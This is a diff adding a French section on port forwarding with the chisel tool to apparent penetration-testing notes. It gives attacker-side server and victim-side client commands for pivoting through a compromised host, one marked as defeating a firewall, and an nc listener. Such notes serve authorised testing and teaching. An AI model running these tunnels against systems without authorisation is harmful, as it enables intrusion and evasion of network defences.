@@ -206,6 +206,14 @@ $ sudo netstat -antop | grep chisel
 tcp        0      0 127.0.0.1:5136          0.0.0.0:*               LISTEN      1449854/./chisel_1.  off (0.00/0/0)
 ```
 
+**Port forwarding avec Chisel**:
+
+On **attacker**: `$ chisel server -v --reverse --port 5036`
+ 
+ - Local => Victim => Other Host : `./chisel client attacker:5036 :8003:Other_Host:8004`, server run on 8004 on **other host**, `curl victim:8003` on attacker
+ - Local <= Victim => Other Host (defeat firewall) :  `./chisel client attacker:5036 R:8003:victim:8004`, other host connect on 8004, `curl 127.0.0.1:8003`on attacker
+ - Other Host => Victim => Local : `./chisel client attacker:5036 :8003:victim:8004`, other host connect on 8004, `nc -lvnp 8003`on attacker
+
 ### netsh
 
 On Windows **Victim**:
